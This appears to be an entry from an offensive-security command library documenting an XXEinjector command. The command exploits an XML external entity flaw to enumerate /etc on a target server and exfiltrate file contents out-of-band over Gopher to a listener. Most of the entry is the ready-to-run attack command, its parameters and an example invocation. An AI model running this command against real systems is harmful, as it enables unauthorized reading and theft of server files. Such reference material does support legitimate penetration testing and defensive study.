---
id: unknown
name: xxeinjector-enumerate-etc-gopher-oob
type: command
executor: bash
data: >-
  ruby XXEinjector.rb --host=$__HOST --path=/etc --file=/tmp/req.txt
  --oob=gopher
output: null
created_at: '2023-04-06T03:56:43.973482+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
  - Linux
tags:
  - xxe
  - oob
  - gopher
verified: true
validated: true
---

# xxeinjector-enumerate-etc-gopher-oob

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --path=/etc --file=/tmp/req.txt --oob=gopher
```

## Description

Performs out-of-band enumeration of /etc using Gopher protocol for XXE data exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --path=/etc | Enumeration path | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --oob=gopher | Gopher OOB method | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
```

## Expected Output

File contents received on OOB listener via Gopher.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
